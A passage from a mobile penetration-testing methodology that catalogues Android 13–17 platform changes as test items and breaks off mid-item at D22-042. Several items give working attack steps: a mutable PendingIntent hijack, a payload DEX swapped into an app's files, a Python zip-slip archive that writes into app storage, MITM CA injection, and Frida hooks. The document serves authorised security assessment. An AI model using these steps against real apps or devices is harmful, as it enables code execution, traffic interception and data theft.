- **Ruled out when:** Every `AndroidKeyStore` call site either propagates the exception to the user or
  retries with no software path, and the induced-failure hook produces no on-disk key material. Record
  the hook output and the post-failure file listing.

### D22-027 · Foreground-service notifications dismissable and the high-priority FCM downgrade

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none directly — rate on the security function that stops running; `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) is not the right path here |
| **Attacker** | AM-01 (the user, or time) |
| **Applies to** | Android 13+ |
| **Maps to** | `about/versions/13/behavior-changes-all` (Task Manager user-initiated stopping; dismissible foreground-service notifications; App Standby Buckets no longer determine FCM quotas; the system downgrades high-priority FCMs sent without displaying a notification; `RemoteMessage.getPriority()`, `PRIORITY_HIGH`, handle `ForegroundServiceStartNotAllowedException`) |

- **Test:** Two Android 13 changes break the same assumption. Users can dismiss FGS notifications and
  stop apps with ongoing foreground services from the drawer's Task Manager, so an "un-killable" FGS is
  now a two-tap user action away from stopping. And high-priority FCMs from apps that repeatedly send
  them **without** displaying a notification get downgraded — so an app using high-priority push as a
  security command channel (session revocation, remote wipe, config push) silently loses timeliness.
- **How:**
  ```bash
  adb shell dumpsys activity services com.target.app | grep -i 'foreground\|fgType'
  # on the device: swipe the FGS notification away; use the Task Manager "Stop" affordance
  adb shell dumpsys activity processes | grep -A2 com.target.app
  grep -rnE 'onMessageReceived|RemoteMessage|getPriority\(\)|PRIORITY_HIGH' out/sources/ -A6
  adb logcat -d | grep -iE 'ForegroundServiceStartNotAllowedException|FirebaseMessaging|priority'
  ```
  Send several high-priority messages that produce no notification, then measure delivery latency of the
  next one.
- **Proof:** The process stopped from the Task Manager with the security function not re-established on
  the next launch; and/or `RemoteMessage.getPriority()` returning a downgraded value with a measurable
  delay on the revocation message.
- **Escalation:** -> D13 session-revocation delay; -> D21 where the FGS was the RASP heartbeat; pair with
  D22-050's `BOOT_COMPLETED` suppression for the "never comes back" half.
- **Ruled out when:** The security function is re-established by a mechanism other than the FGS (a
  server-side check on the next request, a `WorkManager` job with its own constraints) — demonstrate the
  re-arm after a Task Manager stop and a reboot.

### D22-028 · Foreground-service type mandate at targetSdk 34 as a capability map

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) when an unprivileged app can start the typed FGS |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 34 (Android 14+) |
| **Maps to** | `develop/background-work/services/fgs/service-types` (the type-to-permission table: `camera`/`FOREGROUND_SERVICE_CAMERA`, `microphone`/`FOREGROUND_SERVICE_MICROPHONE`, `location`, `health`, `mediaProjection`, `connectedDevice`, `dataSync`, `mediaProcessing`, `remoteMessaging`, `shortService`, `specialUse`, `systemExempted`); `about/versions/14/behavior-changes-14` (Play Console FGS type declaration requirement); ATT&CK T1429, T1512 |

- **Test:** From targetSdk 34 every foreground service must declare `android:foregroundServiceType`, and
  each type requires a specific `FOREGROUND_SERVICE_*` permission plus, for some, a runtime permission.
  The mandate therefore hands you a machine-readable map of which sensitive capabilities the app can hold
  while backgrounded. Cross it against the exported/startable service set.
- **How:**
  ```bash
  grep -nB4 'foregroundServiceType' out/AndroidManifest.merged.xml
  grep -nE 'FOREGROUND_SERVICE_(CAMERA|MICROPHONE|LOCATION|HEALTH|MEDIA_PROJECTION|CONNECTED_DEVICE|DATA_SYNC|MEDIA_PROCESSING|REMOTE_MESSAGING|SPECIAL_USE|SYSTEM_EXEMPTED)' out/AndroidManifest.merged.xml
  adb shell dumpsys activity services com.target.app | grep -iE 'foreground|fgType'
  # attribute each type to a component, and flag third-party namespaces:
  grep -n '<service' out/AndroidManifest.merged.xml | grep -v 'com\.target\.app'
  # then try to start each from the shell UID:
  adb shell am start-foreground-service -n com.target.app/.TheService
  ```
- **Proof:** `android:foregroundServiceType="microphone"` plus `RECORD_AUDIO` on a service that starts
  from an unprivileged caller — that is a remote-triggered background microphone capture, evidenced by
  the service appearing in `dumpsys activity services` with the type set and the mic indicator lit.
- **Escalation:** -> D06 exported/bindable service; -> D20 for the capture itself; -> D18 when the type
  was merged in by a third-party AAR (an analytics SDK obtaining persistent background execution in the
  app's UID).
- **Ruled out when:** Every declared FGS type maps to a component in the app's own namespace that a
  shell-UID start cannot reach (record the `SecurityException` per service), and no type is declared that
  the app's feature set does not use. List type, component, permission, start result.

### D22-029 · `specialUse` and `systemExempted` foreground-service types claimed without a matching reality

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-08 |
| **Applies to** | targetSdk >= 34 |
| **Maps to** | `develop/background-work/services/fgs/service-types` (`specialUse` requires a declared subtype in `<property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE">`; `systemExempted` is reserved for system-level exemptions) |

- **Test:** `specialUse` is the escape hatch of the FGS type system and requires a declared subtype
  string that Play reviews. `systemExempted` is for system-level exemptions. A third-party app claiming
  either, with a subtype that does not describe what the service actually does, has obtained persistent
  background execution outside the typed permission model.
- **How:**
  ```bash
  grep -nA6 'foregroundServiceType="specialUse"' out/AndroidManifest.merged.xml
  grep -n 'PROPERTY_SPECIAL_USE_FGS_SUBTYPE' out/AndroidManifest.merged.xml
  grep -n 'foregroundServiceType="systemExempted"' out/AndroidManifest.merged.xml
  adb shell dumpsys activity services com.target.app | grep -iE 'fgType|specialUse|systemExempted'
  ```
  Then read the service class and record what it actually does for the duration it stays foreground.
- **Proof:** The declared subtype string alongside a trace of what the service does (network calls in
  Burp, files written, sensors read) that does not match it.
- **Escalation:** -> D20 continuous background collection; -> D18 if the service belongs to an SDK.
- **Ruled out when:** The subtype string names a behaviour you observe the service performing, or no
  `specialUse`/`systemExempted` type is declared. Quote the subtype and the observed behaviour.

### D22-030 · Context-registered receivers must declare an export flag at targetSdk 34

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | the flags exist from API 33; declaring one is mandatory for apps targeting API 34+ |
| **Maps to** | MASTG-TECH-0162 (Enumerating Broadcast Receivers), MASTG-KNOW-0134; `about/versions/14/behavior-changes-14` (`Context.RECEIVER_EXPORTED` / `RECEIVER_NOT_EXPORTED` required for non-system broadcasts) |

- **Test:** Runtime-registered receivers never appear in the manifest, so manifest-only enumeration
  misses them entirely. From targetSdk 34 each one must declare `RECEIVER_EXPORTED` or
  `RECEIVER_NOT_EXPORTED` — which means, on a modern app, an exported runtime receiver is again a typed
  decision. Enumerate them at runtime, not statically.
- **How:**
  ```bash
  grep -rnE 'registerReceiver\(' out/sources/ -A4 | grep -nE 'RECEIVER_EXPORTED|RECEIVER_NOT_EXPORTED'
  adb shell dumpsys activity broadcasts | grep -A8 com.target.app | head -60
  # then fire each action from the shell UID:
  adb shell am broadcast -a com.target.app.ACTION_INTERNAL --es payload x
  adb shell am broadcast -a com.target.app.ACTION_INTERNAL -p com.target.app --es payload x
  ```
  Runtime enumeration is more reliable than the grep:
  ```javascript
  Java.perform(function () {
    var C = Java.use('android.content.ContextWrapper');
    C.registerReceiver.overload('android.content.BroadcastReceiver','android.content.IntentFilter','java.lang.String','android.os.Handler','int')
      .implementation = function (r, f, p, h, flags) {
        console.log('[recv] ' + r.$className + ' flags=' + flags + ' perm=' + p);
        return this.registerReceiver(r, f, p, h, flags);
      };
  });
  ```
- **Proof:** A receiver registered with `RECEIVER_EXPORTED` and no `broadcastPermission`, whose
  `onReceive` runs on a broadcast sent from the shell UID and produces an observable state change.
- **Escalation:** -> D05 receivers chapter for the injection and ordered-broadcast work.
- **Ruled out when:** Every `registerReceiver` call site passes `RECEIVER_NOT_EXPORTED`, or passes a
  `broadcastPermission` with a `signature` protection level. Enumerate the hook output — an empty hook
  log on an app you drove through every screen is a valid negative; a static grep alone is not.

### D22-031 · Implicit intents no longer reach internal components — find the export regression that "fixed" it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 34 |
| **Maps to** | `about/versions/14/behavior-changes-14` ("Restrictions to Implicit and Pending Intents"; the documented fix is `explicitIntent.package = context.packageName`, producing `ActivityNotFoundException` for the unfixed case); MASTG-KNOW-0134 |

- **Test:** From targetSdk 34, implicit intents are delivered only to **exported** components, so an
  app's own `context.startActivity(Intent("com.example.action.APP_ACTION"))` throws
  `ActivityNotFoundException`. Teams fix that one of two ways: add `setPackage(...)` (correct), or set
  `android:exported="true"` on the component (a regression that hands the component to every app on the
  device). Hunt the second.
- **How:**
  ```bash
  # implicit sends that were never made explicit:
  grep -rnE 'new Intent\("|Intent\("[a-z]+\.[a-zA-Z._]+"' out/sources/ -A3 | grep -v 'setPackage\|setComponent\|setClassName\|setClass'
  # and the components newly exported to absorb them:
  grep -nB3 -A8 'android:exported="true"' out/AndroidManifest.merged.xml | grep -B6 '<action android:name="com\.target'
  git log --oneline -S 'android:exported="true"' -- '*AndroidManifest.xml'   # if source is available
  adb logcat -d | grep -i ActivityNotFoundException
  ```
- **Proof:** A component that is exported with an app-private action in its filter, reachable by
  `adb shell am start -n com.target.app/.ThatComponent` or by the same custom action from a stub app,
  with the export dated to the same release as the targetSdk bump.
- **Escalation:** -> D04/D05/D06 depending on the component type; -> D08 if it forwards its extras.
- **Ruled out when:** Every app-private action send carries `setPackage(context.packageName)` or an
  explicit component, and every component whose filter carries an app-private action is
  `android:exported="false"`. List the pairs.

### D22-032 · Mutable PendingIntent with `setPackage()` but no component — the targetSdk-34-compliant variant

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); P1 via D08 when the reachable internal component performs an authenticated action |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 34 |
| **Maps to** | `about/versions/14/behavior-changes-14` (creating a mutable `PendingIntent` whose intent has no component or package throws; the documented "SUCCEEDS" example is `setPackage(context.packageName)`); `privacy-and-security/risks/pending-intent`; MASTG-TEST-0381 |

- **Test:** Android 14 made a blank-base mutable `PendingIntent` throw, and the check is satisfied by
  `setPackage(context.packageName)` alone. That narrows the target set to the victim's own components —
  it does not close the class, because the **component** is still fillable and the victim's non-exported
  internal components are exactly what you want.
- **How:**
  ```bash
  grep -rn -B4 -A8 'FLAG_MUTABLE' out/sources/ | grep -nE 'setPackage\(' 
  grep -rnE 'FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/     # the explicit opt-out, if present
  ```
  Then fill in a `ComponentName` **inside the victim package**:
  ```java
  Intent fill = new Intent();
  fill.setComponent(new ComponentName("com.target.app", "com.target.app.internal.SettingsActivity"));
  pi.send(ctx, 0, fill);
  ```
- **Proof:** The victim's non-exported internal component on top of the task stack
  (`adb shell dumpsys activity activities | grep -B2 -A8 com.target.app`), started from an attacker
  process that has no permission to reach it directly.
- **Escalation:** -> D08 for the full acquisition and fill-in work; -> D15 for the backend action.
- **Ruled out when:** Every mutable `PendingIntent` base intent sets an explicit component, or no
  `FLAG_MUTABLE` exists in the app. Record the call sites and their base-intent shapes.

### D22-033 · Dynamic-code-load read-only mandate at targetSdk 34 — and the paths apps moved to

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when you execute code in the app's process; local variant rated on the write primitive |
| **Attacker** | AM-03 (with a co-writable path) / AM-09 (malicious CDN serving the payload) |
| **Applies to** | targetSdk >= 34 for the enforcement; the writable-code-path class exists at every level. Android 17 / targetSdk 37 extends read-only enforcement to `System.load()` native libraries |
| **Maps to** | `about/versions/14/behavior-changes-14` ("All dynamically-loaded files must be marked read-only before content is written"; the documented `jar.setReadOnly()`-before-write pattern); `privacy-and-security/risks/dynamic-code-loading`; MASVS-CODE |

- **Test:** Android 14 requires DEX/JAR/APK files to be `setReadOnly()` **before** content is written,
  or the class loader throws. Apps doing OTA code delivery had to change something: some added the call,
  some moved the payload out of the checked path entirely — a native `dlopen`, a write-then-copy, an
  in-memory loader. Audit whatever path they moved to, because the platform check no longer covers it.
- **How:**
  ```bash
  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader|setReadOnly\(\)|optimizedDirectory' out/sources/ -B6 -A10
  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen' out/sources/
  adb shell run-as com.target.app ls -l files/*.jar files/*.dex app_dex/ 2>/dev/null
  adb logcat -d | grep -iE 'is not read-only|dex file.*not.*read-only'
  ```
  If a loadable file is writable, substitute it and show your code running:
  ```bash
  adb shell run-as com.target.app cp /sdcard/Download/payload.dex files/module.dex
  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
  adb logcat -d | grep -i 'PWNED'
  ```
- **Proof:** A writable `.jar`/`.dex` under the app's data directory that is loaded at runtime, then a
  marker string logged from your substituted code under the app's UID (`adb shell ps -A | grep
  com.target.app` for the UID, `logcat | grep` for the marker). Use an 8+ character random marker and
  confirm it is absent from the baseline log first.
- **Escalation:** -> D17 supply chain and OTA delivery; -> D21 (RASP removed by replacing the module
  that implements it).
- **Ruled out when:** Every loader call site is preceded by `setReadOnly()` on a file under the app's
  private directory with mode `-r--------`, and no `System.load` targets a writable path. Paste the
  `ls -l` output.

### D22-034 · Zip path validation on by default at targetSdk 34 — find `ZipPathValidator.clearCallback()`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loadable code path; `server_side_injection.file_inclusion.local` (P1) for the read variant; otherwise rated on the file written |
| **Attacker** | AM-02 (a downloaded archive) / AM-03 |
| **Applies to** | targetSdk >= 34 for the default protection; the class is universal below it |
| **Maps to** | `about/versions/14/behavior-changes-14` (`ZipFile` and `ZipInputStream.getNextEntry()` throw `ZipException` for entries containing `..` or starting with `/`; opt-out `dalvik.system.ZipPathValidator.clearCallback()`); `privacy-and-security/risks/zip-path-traversal`; `privacy-and-security/risks/path-traversal`; MASVS-STORAGE |

- **Test:** The platform blocks zip-slip by default for targetSdk 34+ apps — and ships a documented
  process-wide opt-out. A `ZipPathValidator.clearCallback()` call in a modern app re-enables the class
  for every archive the process ever opens. Its presence is the finding; the traversal is the proof.
- **How:**
  ```bash
  grep -rnE 'ZipPathValidator|clearCallback' out/sources/
  grep -rnE 'ZipInputStream|ZipFile|getNextEntry|ZipEntry' out/sources/ -A8 | grep -nE 'getName\(\)|new File\(|FileOutputStream'
  ```
  Build a traversal archive and feed it through the app's import/update path:
  ```bash
  python3 - <<'PY'
  import zipfile
  z = zipfile.ZipFile('/tmp/evil.zip','w')
  z.writestr('../../../../data/data/com.target.app/shared_prefs/zzq4hd2k9pq.xml',
             '<?xml version="1.0"?><map><string name="m">zzq4hd2k9pq</string></map>')
  z.close()
  PY
  adb push /tmp/evil.zip /sdcard/Download/
  # then import it through the app's own flow, and:
  adb shell run-as com.target.app ls -la shared_prefs/
  adb logcat -d | grep -i ZipException
  ```
- **Proof:** With `clearCallback()` present, `shared_prefs/zzq4hd2k9pq.xml` exists after the import
  (search the baseline listing for the marker first, to prove it was not already there). Without it, a
  `ZipException` in logcat and no file.
- **Escalation:** -> D17 when the landing path is loadable code; -> D11 when it overwrites a config that
  controls trust (a pinning config, a feature-flag file, an endpoint list).
- **Ruled out when:** No `clearCallback()` anywhere in the app, `targetSdk >= 34`, and the traversal
  archive produces `ZipException` through every import path you can reach. On `targetSdk < 34` this is
  never ruled out by the platform — you must test each extractor manually and check for a
  `getCanonicalPath().startsWith(destDir)` guard in the code.

### D22-035 · The CA trust store moved into the Conscrypt APEX at API 34

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (P5) for the harness half; the RASP half is rated on the control it defeats, and the traffic it opens is what carries the P1 |
| **Attacker** | AM-06 for the real attack; AM-07/AM-12 for the harness (a tester's CA is **not** an attacker model) |
| **Applies to** | Android 14+; some Android 12/13 devices with Conscrypt Mainline updates already use the APEX path |
| **Maps to** | `source.android.com/docs/core/ota/modular-system/conscrypt` ("Android 14 introduced updatable root certificates… root trust certificates are stored in the Conscrypt module APEX and the system partition"; paths `/apex/com.android.conscrypt/cacerts` and `/system/etc/security/cacerts`; APEX package `com.android.conscrypt`); MASTG-TEST-0285; MASTG-TEST-0242 |

- **Test:** Three consequences, and only one of them is a finding. (1) Your harness: writing a CA into
  `/system/etc/security/cacerts` may no longer be sufficient on Android 14+. (2) **The finding:** a RASP
  implementation that detects interception by enumerating or hashing the system trust store is reading
  one of two paths and is blind to the other. (3) Google can push trust-store changes out of band, so a
  pinning-free app's trust set is mutable between your test and the client's production.
- **How:**
  ```bash
  adb shell ls /system/etc/security/cacerts | wc -l
  adb shell ls /apex/com.android.conscrypt/cacerts | wc -l
  adb shell ls -l /apex/ | grep conscrypt
  # place the CA in both locations on a rooted google_apis image:
  adb root && adb remount
  adb push mitm.0 /system/etc/security/cacerts/
  adb shell "mount -o rw,remount /apex/com.android.conscrypt && cp /system/etc/security/cacerts/mitm.0 /apex/com.android.conscrypt/cacerts/"
  # then find which path the app itself reads:
  frida-trace -U -f com.target.app -j '*!*cacert*' -j '*!*trust*'
  ```
- **Proof:** For the RASP finding: a Frida/strace trace showing the app stats only
  `/system/etc/security/cacerts` while interception succeeds through the APEX copy — with the
  intercepted traffic as the impact. For the harness half: interception failing with only the legacy
  copy and succeeding after the APEX copy on the same Android 14+ device.
- **Escalation:** -> D14 for the pinning posture; -> D21 for the detection bypass; -> D15 for whatever
  the now-readable traffic carries.
- **Ruled out when:** The app performs certificate pinning that survives a CA in both stores (show the
  handshake failure with both copies present), or its interception detector reads both paths (show the
  trace covering both). "Interception worked" alone is a P5 pinning observation, not this item.

### D22-036 · Screenshot and screen-recording detection APIs present but unused

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) is the nearest mobile path and is Informational; report only through the data that was captured |
| **Attacker** | AM-04 (a screen-capturing app the user was social-engineered into installing) |
| **Applies to** | screenshot detection Android 14+ (`DETECT_SCREEN_CAPTURE` + `Activity.ScreenCaptureCallback`); screen-recording callback Android 15+ (`WindowManager.addScreenRecordingCallback()`, `SCREEN_RECORDING_STATE_VISIBLE`) |
| **Maps to** | `about/versions/14/features/screenshot-detection` (`<uses-permission android:name="android.permission.DETECT_SCREEN_CAPTURE" />`, `registerScreenCaptureCallback(mainExecutor, cb)` in `onStart()`, `unregisterScreenCaptureCallback(cb)` in `onStop()`, per-activity scope, the callback does **not** receive the image, `FLAG_SECURE` prevents capture entirely, and — critically — "Only detects screenshots from hardware button combinations, not from ADB or instrumentation tests"); `about/versions/15/features` (`addScreenRecordingCallback()`, `SCREEN_RECORDING_STATE_VISIBLE`, `removeScreenRecordingCallback`) |

- **Test:** For an app whose threat model includes remote-access-trojan scams — banking, crypto,
  brokerage — the absence of both detection APIs **and** `FLAG_SECURE` on the transaction screen is a
  missing control. It is only reportable where you can show a concrete capture of something that matters
  (a full PAN, a recovery phrase, a one-time code).
- **How:**
  ```bash
  grep -n 'DETECT_SCREEN_CAPTURE' out/AndroidManifest.merged.xml
  grep -rnE 'registerScreenCaptureCallback|unregisterScreenCaptureCallback|addScreenRecordingCallback|SCREEN_RECORDING_STATE_VISIBLE|FLAG_SECURE|setContentSensitivity' out/sources/
  # capture with the hardware combination on a real device, NOT with adb:
  adb shell input keyevent --longpress KEYCODE_POWER   # or the device's screenshot chord
  adb exec-out screencap -p > /tmp/shot.png            # <- proves nothing about the callback; see below
  ```
  **Do not** use `adb shell screencap` as the PoC for the screenshot API — the documentation states ADB
  capture is not detected, so a null result there is meaningless.
- **Proof:** A hardware-chord screenshot of the sensitive screen with no in-app reaction (no blur, no
  session invalidation, no warning), on a screen that also lacks `FLAG_SECURE`, plus the captured image
  showing the sensitive value.
- **Escalation:** -> D20 for the disclosure; -> D13 where the captured value is a one-time code.
- **Ruled out when:** The sensitive activity sets `FLAG_SECURE` (verify: `adb shell screenrecord` output
  is black for that screen), or it registers the capture callback and reacts observably. Show the black
  frame or the reaction.

### D22-037 · MediaProjection per-session consent at targetSdk 34 — and the fallbacks it pushed apps to

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 / the app itself against its own user |
| **Applies to** | targetSdk >= 34 |
| **Maps to** | `about/versions/14/behavior-changes-14` (per-session consent, `SecurityException` on reuse of a cached `Intent`/`MediaProjection`, `VirtualDisplay#resize()`/`setSurface()` for configuration changes, mandatory `MediaProjection.Callback` with `onStop()`); `about/versions/15/behavior-changes-all` (status-bar chip; auto-stops when the device screen locks) |

- **Test:** From targetSdk 34 each capture session needs fresh consent and reusing a cached projection
  throws. Apps that cached consent to avoid re-prompting either re-prompt (fine) or fall back to
  something worse: an accessibility service, or a `mediaProjection` foreground service kept alive across
  what the user perceives as separate sessions.
- **How:**
  ```bash
  grep -rnE 'createScreenCaptureIntent|getMediaProjection|createVirtualDisplay|MediaProjection\.Callback|registerCallback' out/sources/
  grep -n 'foregroundServiceType="mediaProjection"' out/AndroidManifest.merged.xml
  grep -rnE 'AccessibilityService|BIND_ACCESSIBILITY_SERVICE' out/AndroidManifest.merged.xml out/sources/
  adb shell dumpsys media_projection
  adb logcat -d | grep -i 'SecurityException.*MediaProjection'
  ```
- **Proof:** A `mediaProjection` FGS still running (`dumpsys media_projection`) across two user-visible
  sessions with only one consent dialog, or an accessibility-service capability introduced in the same
  release that removed the consent caching.
- **Escalation:** -> D20 continuous capture; -> D21 if the accessibility fallback also defeats the app's
  own overlay protections.
- **Ruled out when:** Every capture session shows a fresh consent dialog and `dumpsys media_projection`
  reports no active projection between sessions. Record both dumps.

### D22-038 · `OWNER_PACKAGE_NAME` redaction (Android 14) — provenance checks that now fail open

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — a provenance-based authorisation decision bypassed |
| **Attacker** | AM-03 (an app that places a file into shared media) |
| **Applies to** | Android 14+, **all apps regardless of targetSdk** |
| **Maps to** | `about/versions/14/behavior-changes-all` (`MediaStore.MediaColumns.OWNER_PACKAGE_NAME` redacted unless the owner is always-visible or the querying app holds `QUERY_ALL_PACKAGES`) |

- **Test:** From Android 14 the owner-package column is redacted for most callers. An app that used that
  column to decide "this file came from a trusted app, so skip validation" now receives null or a
  redacted value — and the question is which branch it takes. A fail-open provenance check is a real
  authorisation bypass introduced by a platform change the developer never noticed.
- **How:**
  ```bash
  grep -rnE 'OWNER_PACKAGE_NAME|MediaColumns\.OWNER' out/sources/ -B4 -A10
  grep -n 'QUERY_ALL_PACKAGES' out/AndroidManifest.merged.xml
  ```
  Place a file from a third app, then log the column value the target actually reads:
  ```javascript
  Java.perform(function () {
    var Cur = Java.use('android.database.CursorWrapper');
    Cur.getString.implementation = function (i) {
      var v = this.getString(i);
      console.log('[cursor] idx=' + i + ' val=' + v);
      return v;
    };
  });
  ```
- **Proof:** The hook showing a null/redacted owner value, followed by the app executing its trusted
  branch on your file — with the resulting effect (a parser reached, a validation skipped, a file
  imported without a signature check).
- **Escalation:** -> D17, by feeding a malicious file into the parser that was trusted because of
  provenance; -> D07 for the provider side.
- **Ruled out when:** The app either holds `QUERY_ALL_PACKAGES` (record it — that then becomes a D20
  privacy item) or treats a null owner as untrusted (show the fail-closed branch taken). Log the value
  and the branch.

### D22-039 · SDK Runtime (Privacy Sandbox) — `<uses-sdk-library>` pinning and what still crosses the boundary

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) for the data hand-off; `broken_access_control.privilege_escalation` (null) for an unpinned SDK identity |
| **Attacker** | AM-08 malicious third-party SDK |
| **Applies to** | Android 14+ for the SDK Runtime environment; Privacy Sandbox incorporated in Android 16 |
| **Maps to** | `privacysandbox.google.com/private-advertising/sdk-runtime` (separate SDK Runtime process; "No app data access", "Permission limitations", "File access constraints", "IPC restrictions", "Activity access: Controlled through `SdkSandboxActivityHandler`"; `SdkSandboxManager`, `loadSdk()`, `SandboxedSdkProvider`, `SdkSandboxController`, `<uses-sdk-library>`, `certDigest`); `about/versions/16/features` |

- **Test:** Android 14 moved runtime-enabled SDKs into a separate process with no access to the app's
  data directory, only explicitly granted permissions, restricted file access and restricted IPC. Two
  testable questions follow. Does the app still hand secrets across that boundary in the `loadSdk()`
  bundle, defeating the isolation it paid for? And does `<uses-sdk-library>` pin the SDK's identity with
  a real `certDigest`?
- **How:**
  ```bash
  grep -nA4 'uses-sdk-library' out/AndroidManifest.merged.xml      # certDigest present and non-placeholder?
  grep -rnE 'SdkSandboxManager|loadSdk|SandboxedSdkProvider|SdkSandboxController|SdkSandboxActivityHandler' out/sources/
  adb shell ps -A | grep sdk_sandbox
  adb shell dumpsys sdk_sandbox 2>/dev/null
  ```
  ```javascript
  Java.perform(function () {
    var M = Java.use('android.app.sdksandbox.SdkSandboxManager');
    M.loadSdk.implementation = function (name, params, ex, cb) {
      console.log('[loadSdk] ' + name + ' params=' + params.toString());
      return this.loadSdk(name, params, ex, cb);
    };
  });
  ```
- **Proof:** Hook output showing a `loadSdk()` `Bundle` carrying a user identifier, an email or an auth
  token; or a `<uses-sdk-library>` entry whose `certDigest` is absent or a placeholder.
- **Escalation:** -> D18 third-party data flow; -> D20 data-safety mismatch.
- **Ruled out when:** No `SdkSandboxManager` usage at all (grep count zero), or every `loadSdk` bundle
  carries only non-identifying configuration and `certDigest` matches the SDK provider's published
  digest. Paste the bundle contents.

### D22-040 · `ad_services` SDK-extension gating — Privacy Sandbox code reachable below its nominal API level

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-05 |
| **Applies to** | Android 13+ (API 33) devices carrying the ad services extension |
| **Maps to** | `developer.android.com/guide/sdk-extensions` (`SdkExtensions.getExtensionVersion()`, `SdkExtensions.AD_SERVICES`, eligible on Android 13/API 33+, `android:minExtensionVersion`) |

- **Test:** `SdkExtensions.getExtensionVersion(SdkExtensions.AD_SERVICES)` gates Privacy Sandbox
  advertising APIs on Android 13+ devices — not Android 14+. Code paths behind that gate are routinely
  unreviewed because the team assumed they could not run. The same principle applies to every modular
  API: an extension version can make a "modern" code path live on an older device and an older fallback
  live on a newer one.
- **How:**
  ```bash
  grep -rnE 'AD_SERVICES|android\.adservices|adservices' out/sources/ out/AndroidManifest.merged.xml
  grep -n 'minExtensionVersion' out/AndroidManifest.merged.xml
  adb shell getprop | grep build.version.extensions
  ```
  Force both sides of the branch with a hook that returns a chosen extension version, and drive the app
  through the feature on each:
  ```javascript
  Java.perform(function () {
    var SE = Java.use('android.os.ext.SdkExtensions');
    SE.getExtensionVersion.implementation = function (n) { return 0; };   // then re-run with a high value
  });
  ```
- **Proof:** An `AD_SERVICES >= N` branch executing on an Android 13 device, with the data it collects
  captured in Burp; or a legacy branch executing on a modern device because the extension version is low.
- **Escalation:** -> D20 undisclosed collection; -> D17 if the branch loads different code.
- **Ruled out when:** No `SdkExtensions` reference and no `adservices` package usage in the app (record
  the counts), or both branches of every extension gate have been driven and produce the same data flow.

### D22-041 · Minimum installable targetSdk and `--bypass-low-target-sdk-block`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (P5) standalone; Medium only when the client's own distribution channel ships the sub-minimum build |
| **Attacker** | AM-11 |
| **Applies to** | Android 14 refuses installs below targetSdk 23; Android 15 raises the floor to 24 |
| **Maps to** | `about/versions/14/behavior-changes-all` (minimum installable targetSdkVersion; `--bypass-low-target-sdk-block`); `about/versions/15/behavior-changes-all` (floor raised to 24; the rationale is that low targets bypass runtime permissions and later mitigations) |

- **Test:** Two things to establish. Can the app under test even install on the OS versions the client
  claims to support? And — the part that is actually reportable — does the client's own distribution
  channel (an enterprise MDM, a sideload updater, a white-label OEM preload) ship a sub-minimum-target
  APK using the bypass flag, which means they are deliberately shipping an app that opts out of runtime
  permissions and every mitigation layered on top?
- **How:**
  ```bash
  adb install base.apk
  # INSTALL_FAILED_DEPRECATED_SDK_VERSION: App package must target at least SDK version 24, but found N
  adb install --bypass-low-target-sdk-block base.apk
  adb shell getprop ro.build.version.sdk
  ```
- **Proof:** The literal `INSTALL_FAILED_DEPRECATED_SDK_VERSION` string with the found target, followed
  by a successful install with the bypass flag — and, for the reportable variant, the client confirming
  that their distribution uses it.
- **Escalation:** -> every LEGACY item in D22-070 → D22-077, all of which become live simultaneously.
- **Ruled out when:** The app installs on the Android 14/15/16 images without the bypass flag. Record the
  three successful installs; that single fact also closes several LEGACY rows.

### D22-042 · `USE_FULL_SCREEN_INTENT` held by a non-calling, non-alarm app

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) when the destination is attacker-influenced; the phishing outcome is rated by what it captures |
| **Attacker** | AM-02 (push-delivered) / AM-08 |
| **Applies to** | targetSdk >= 34 for the restriction; the capability check is Android 14+ |
| **Maps to** | `about/versions/14/behavior-changes-14` (`USE_FULL_SCREEN_INTENT` limited to calling and alarm apps; `NotificationManager.canUseFullScreenIntent()`; `Settings.ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT`) |

- **Test:** Android 14 restricts full-screen intents to calling and alarm apps and adds a runtime
  capability check. An app outside those categories that still posts full-screen-intent notifications
  can raise a full-screen UI over the lock screen. That is a phishing surface, and it is High when the
  destination comes from a push payload or a deep link rather than being fixed.
- **How:**
  ```bash
